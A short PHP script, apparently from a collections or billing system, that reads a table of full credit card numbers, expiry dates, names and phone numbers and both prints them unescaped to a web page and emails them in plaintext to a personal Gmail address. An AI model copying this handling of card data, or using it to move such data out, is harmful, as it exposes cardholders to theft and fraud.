<?php

class dumpToScreen {

function dbconnect()   {
require"../dbConnect.php";
return $dbMain;
}
//==============================================================================================
function moveData(){

$dbMain = $this->dbconnect();

$message = "Contract_key  <>    Credit_card   <>  Exp   <>    Name   <>    Amount   <>  Card_type    <>   Reason_code  <>   Reason_descrip   <>   Fail_date   <>     Trans_title\r\n";

// In case any of our lines are larger than 70 characters, we should use wordwrap()
//$message = wordwrap($message, 70, "\r\n");

// Send


//echo "Contract_key  <>    Credit_card   <>  Exp   <>    Name   <>    Amount   <>  Card_type    <>   Reason_code  <>   Reason_descrip   <>   Fail_date   <>     Trans_title<br>";
$stmt = $dbMain->prepare("SELECT * FROM collections_good_cards WHERE contract_key != ''");
$stmt->execute();      
$stmt->store_result();      
$stmt->bind_result($contract_key,$credit_card_num,$card_exp,$card_name,$amount_owed,$card_type,$reason_code,$reason_descrip,$fail_date,$trans_title,$phone);   
while($stmt->fetch()){
    
    echo "$contract_key  <>   $credit_card_num   <>     $card_exp   <>    $card_name   <>   $amount_owed    <>    $card_type   <>   $reason_code   <>     $reason_descrip  <>   $fail_date   <>   $trans_title <> $phone<br><br>";
    
    $message .= "$contract_key  <>   $credit_card_num   <>     $card_exp   <>    $card_name   <>   $amount_owed    <>    $card_type   <>   $reason_code   <>     $reason_descrip  <>   $fail_date   <>   $trans_title <> $phone \r\n\r\n";
}
$message = wordwrap($message, 70, "\r\n");
mail('christopherparello@gmail.com', 'Collections Good Cards', $message);

}

//===========================================================================================================
}
$update = new dumpToScreen();
$update->moveData();


?>